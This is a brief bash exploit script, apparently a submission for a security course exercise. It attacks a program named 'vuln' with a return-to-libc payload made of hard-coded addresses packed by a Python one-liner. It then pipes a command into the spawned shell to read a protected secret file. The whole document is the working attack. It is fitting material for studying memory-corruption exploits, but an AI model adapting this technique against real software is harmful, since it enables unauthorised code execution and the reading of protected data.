#!/usr/bin/env bash

cd /task4/s2895113

echo /bin/cat /task4/secret.txt | env -i SHELL=/bin/sh \
  ./vuln $(python3 -c "import sys; sys.stdout.buffer.write(b'\xd0\x4c\xdc\xf7' + b'\xf0\x71\xdb\xf7' + b'\xd5\x60\xf3\xf7')") 1329
